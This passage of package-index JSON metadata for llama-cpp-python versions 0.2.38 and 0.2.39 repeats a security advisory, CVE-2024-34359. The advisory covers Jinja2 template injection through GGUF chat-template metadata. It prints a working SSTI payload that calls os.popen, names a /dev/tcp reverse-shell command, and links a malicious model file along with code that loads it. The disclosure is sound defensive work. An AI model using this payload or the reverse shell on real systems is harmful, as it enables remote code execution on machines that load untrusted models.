Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.38":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.38/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.38","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"90417774fb44546685c88193629f95e20adad3a3078a0bdb9aeacb174a6ee9ca","md5":"87c730822d70fdc61821f735267dc0e1","sha256":"5acf5dd43e7e36e012924c92cb27612cd116571fe5849528758a2d6b301b7139"},"downloads":-1,"filename":"llama_cpp_python-0.2.38.tar.gz","has_sig":false,"md5_digest":"87c730822d70fdc61821f735267dc0e1","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10727846,"upload_time":"2024-01-31T20:23:51","upload_time_iso_8601":"2024-01-31T20:23:51.932223Z","url":"https://files.pythonhosted.org/packages/90/41/7774fb44546685c88193629f95e20adad3a3078a0bdb9aeacb174a6ee9ca/llama_cpp_python-0.2.38.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.39":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.39/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.39","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"afa66b836876620823551650db19d217118b9ef0983a936aa7895ed5d05df9c0","md5":"2bc6ac6ea02407f80f2819abcef15993","sha256":"e4fed6d0e9b925810a6463d75ef339d73288db5fa004938e5b6ce4fb40977d4f"},"downloads":-1,"filename":"llama_cpp_python-0.2.39.tar.gz","has_sig":false,"md5_digest":"2bc6ac6ea02407f80f2819abcef15993","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10769582,"upload_time":"2024-02-06T17:50:05","upload_time_iso_8601":"2024-02-06T17:50:05.241964Z","url":"https://files.pythonhosted.org/packages/af/a6/6b836876620823551650db19d217118b9ef0983a936aa7895ed5d05df9c0/llama_cpp_python-0.2.39.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like 